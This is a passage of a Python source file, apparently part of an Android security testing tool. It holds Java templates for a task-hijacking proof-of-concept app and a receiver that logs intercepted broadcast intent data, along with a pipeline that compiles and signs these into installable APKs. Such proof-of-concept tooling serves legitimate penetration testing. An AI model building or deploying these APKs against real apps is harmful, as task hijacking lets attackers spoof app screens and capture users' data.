                launchTargetActivities();
            }}
        }});
        layout.addView(btnLaunch);

        // Info about recent tasks
        TextView tvRecent = new TextView(this);
        tvRecent.setText("\\nAfter launching, check Recent Apps —\\n"
            + "the target may appear in our task stack.");
        tvRecent.setTextColor(0xFF8892B0);
        tvRecent.setTextSize(11);
        tvRecent.setGravity(Gravity.CENTER);
        tvRecent.setPadding(0, 24, 0, 0);
        layout.addView(tvRecent);

        setContentView(layout);
    }}

    private void performTaskHijack() {{
        // Method 1: Launch target activity with task flags
        try {{
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_ACTIVITIES[0]));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_MULTIPLE_TASK
                | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            tvStatus.setText("Task hijack initiated! Target launched in shared task.");
            tvStatus.setTextColor(0xFF00E676);
        }} catch (Exception e) {{
            tvStatus.setText("Could not hijack: " + e.getMessage());
            tvStatus.setTextColor(0xFFFF1744);
        }}
    }}

    private void launchTargetActivities() {{
        int launched = 0;
        for (String act : TARGET_ACTIVITIES) {{
            try {{
                Intent intent = new Intent();
                intent.setComponent(new ComponentName(TARGET_PACKAGE, act));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                launched++;
                break; // Launch first available
            }} catch (Exception e) {{
                // Try next activity
            }}
        }}
        if (launched > 0) {{
            tvStatus.setText("Launched target activity — check task stack!");
            tvStatus.setTextColor(0xFF00E676);
        }} else {{
            tvStatus.setText("Could not launch any target activities");
            tvStatus.setTextColor(0xFFFF1744);
        }}
    }}
}}"""

    def _gen_hijack_receiver(self, poc_package: str, target: dict) -> str:
        """Generate broadcast receiver for remote task hijack triggers."""
        return f"""package {poc_package};

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * Broadcast receiver that can be triggered remotely to initiate task hijacking.
 * When the target app sends a broadcast, this receiver captures it and
 * uses the intent data to launch activities in the shared task.
 */
public class HijackReceiver extends BroadcastReceiver {{
    private static final String TAG = "TaskHijack";

    @Override
    public void onReceive(Context context, Intent intent) {{
        Log.d(TAG, "Received trigger: " + intent.getAction());

        // Capture the intent data for analysis
        if (intent.getData() != null) {{
            Log.d(TAG, "Intent data: " + intent.getData().toString());
        }}
        if (intent.getExtras() != null) {{
            Log.d(TAG, "Intent extras: " + intent.getExtras().toString());
        }}
    }}
}}"""

    # ─── APK Compilation ──────────────────────────────────────────────

    def _compile_apk(self, work_dir: Path, poc_package: str, apk_name: str) -> str:
        """
        Compile a minimal Android APK from source using SDK tools.

        Steps:
        1. aapt package → generates R.java and base APK
        2. javac → compiles Java sources
        3. d8 → converts to DEX
        4. aapt add → adds DEX to APK
        5. zipalign → aligns the APK
        6. apksigner → signs the APK

        Returns path to the signed APK, or empty string on failure.
        """
        log = []
        gen_dir = work_dir / 'gen'
        bin_dir = work_dir / 'bin'
        classes_dir = work_dir / 'classes'
        gen_dir.mkdir(exist_ok=True)
        bin_dir.mkdir(exist_ok=True)
        classes_dir.mkdir(exist_ok=True)

        aapt = _sdk_tool('aapt')
        d8_bat = _sdk_tool('d8.bat')
        zipalign = _sdk_tool('zipalign.exe')
        apksigner_bat = _sdk_tool('apksigner.bat')
        android_jar = _android_jar()

        # Step 1: Package resources with aapt
        cmd = [
            aapt, 'package', '-f', '-m',
            '-S', str(work_dir / 'res'),
            '-J', str(gen_dir),
            '-M', str(work_dir / 'AndroidManifest.xml'),
            '-I', android_jar,
        ]
        r = self._run(cmd)
        if r['returncode'] != 0:
            import sys
            print(f'[PoC] aapt package FAILED (rc={r["returncode"]}): {r["stderr"]}', file=sys.stderr)
            return ''
        log.append('aapt package: OK')

        # Step 2: Compile Java
        # Find all .java files
        java_files = list(work_dir.rglob('*.java'))
        if not java_files:
            return ''

        java_home = self._find_java_home()
        bin_dir_java = os.path.join(java_home, 'bin') if java_home else ''
        javac_bin = os.path.join(bin_dir_java, 'javac.exe') if bin_dir_java else 'javac'
        keytool_bin = os.path.join(bin_dir_java, 'keytool.exe') if bin_dir_java else 'keytool'

        java_cp = android_jar
        cmd = [javac_bin, '-source', '1.8', '-target', '1.8',
               '-classpath', java_cp,
               '-d', str(classes_dir),
               '-sourcepath', str(work_dir)]
        for jf in java_files:
            cmd.append(str(jf))

        r = self._run(cmd)
        if r['returncode'] != 0:
            import sys
            print(f'[PoC] javac FAILED (rc={r["returncode"]}): {r["stderr"]}', file=sys.stderr)
            return ''
        log.append('javac: OK')

        # Step 3: Convert to DEX with d8
        class_files = list(classes_dir.rglob('*.class'))
        cmd = [d8_bat, '--output', str(bin_dir), '--lib', android_jar]
        for cf in class_files:
            cmd.append(str(cf))

        r = self._run(cmd)
        if r['returncode'] != 0:
            import sys
            print(f'[PoC] d8 FAILED (rc={r["returncode"]}): {r["stderr"]}', file=sys.stderr)
            return ''
        log.append('d8: OK')

        # Step 4: Create unsigned APK
        unsigned_apk = bin_dir / 'unsigned.apk'
        cmd = [
            aapt, 'package', '-f',
            '-S', str(work_dir / 'res'),
            '-M', str(work_dir / 'AndroidManifest.xml'),
            '-I', android_jar,
            '-F', str(unsigned_apk),
        ]
        r = self._run(cmd)
        if r['returncode'] != 0:
            import sys
            print(f'[PoC] aapt package APK FAILED (rc={r["returncode"]}): {r["stderr"]}', file=sys.stderr)
            return ''
        log.append('aapt package APK: OK')

        # Add DEX to APK — copy to bin_dir so aapt stores it as classes.dex, not full path
        dex_file = bin_dir / 'classes.dex'
        if not dex_file.exists():
            import sys
            print(f'[PoC] classes.dex not found in {bin_dir}', file=sys.stderr)
            return ''

        # Run aapt add from bin_dir so the dex is added with a flat name
        import subprocess as _sp
        env = {**os.environ, 'JAVA_HOME': self._find_java_home()}
        dex_add_cmd = [aapt, 'add', '-f', str(unsigned_apk), 'classes.dex']
        try:
            r_add = _sp.run(dex_add_cmd, capture_output=True, text=True, timeout=30,
                            cwd=str(bin_dir), env=env)
            if r_add.returncode != 0:
                print(f'[PoC] aapt add FAILED (rc={r_add.returncode}): {r_add.stderr}', file=sys.stderr)
                return ''
        except Exception as e:
            print(f'[PoC] aapt add exception: {e}', file=sys.stderr)
            return ''
        log.append('aapt add dex: OK')

        # Step 5: Zipalign
        aligned_apk = bin_dir / 'aligned.apk'
        cmd = [zipalign, '-f', '4', str(unsigned_apk), str(aligned_apk)]
        r = self._run(cmd)
        if r['returncode'] != 0:
            # Zipalign failed, use unsigned
            aligned_apk = unsigned_apk
        log.append('zipalign: OK')

        # Step 6: Sign with apksigner
        final_apk = self.output_dir / apk_name

        # Generate a debug keystore if needed
        keystore = self.output_dir / 'debug.keystore'
        if not keystore.exists():
            cmd = [keytool_bin, '-genkey', '-v',
                   '-keystore', str(keystore),
                   '-storepass', 'android',
                   '-keypass', 'android',
                   '-alias', 'androiddebugkey',
                   '-keyalg', 'RSA',
                   '-keysize', '2048',
                   '-validity', '10000',
                   '-dname', 'CN=Debug, OU=Debug, O=Debug, L=Debug, ST=Debug, C=US']
            r = self._run(cmd)
            # keytool may return 1 even on success (Windows quirk) — check if keystore exists
            if not keystore.exists():
                return ''

        cmd = [apksigner_bat, 'sign',
               '--ks', str(keystore),
               '--ks-pass', 'pass:android',
               '--key-pass', 'pass:android',
               '--ks-key-alias', 'androiddebugkey',
               '--out', str(final_apk),
               str(aligned_apk)]
        r = self._run(cmd)
        if r['returncode'] != 0:
            # Fallback: just copy aligned APK
            shutil.copy2(str(aligned_apk), str(final_apk))
        log.append('apksigner: OK')

        if final_apk.exists():
            return str(final_apk)
        return ''

    def _run(self, cmd: list) -> dict:
        """Run a command and return output.

        On Windows, .bat files must be invoked via 'cmd /c'.
        We also capture stderr for debugging.
        """
        env = {**os.environ, 'JAVA_HOME': self._find_java_home()}

        # Wrap .bat files with cmd /c on Windows
        if os.name == 'nt' and cmd and cmd[0].lower().endswith('.bat'):
            cmd = ['cmd', '/c'] + cmd

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120,
                cwd=str(self.output_dir),
                env=env,
            )
            return {
                'stdout': result.stdout.strip(),
                'stderr': result.stderr.strip(),
                'returncode': result.returncode,
            }
        except FileNotFoundError as e:
            return {'stdout': '', 'stderr': str(e), 'returncode': -1}
        except subprocess.TimeoutExpired:
            return {'stdout': '', 'stderr': 'Command timed out', 'returncode': -1}

    def _find_java_home(self) -> str:
        """Find JAVA_HOME (the root of the JDK, NOT the bin dir)."""
        jh = os.environ.get('JAVA_HOME', '')
        if jh and os.path.exists(jh):
            # If it ends with bin, go up one level
            if jh.lower().endswith('bin') and os.path.exists(os.path.dirname(jh)):
                return os.path.dirname(jh)
            return jh
        # Try Android Studio JBR (the root directory)
        candidates = [
            r'C:\Program Files\Android\Android Studio\jbr',
        ]
        for c in candidates:
            if os.path.exists(c) and os.path.exists(os.path.join(c, 'bin', 'java.exe')):
                return c
        return ''
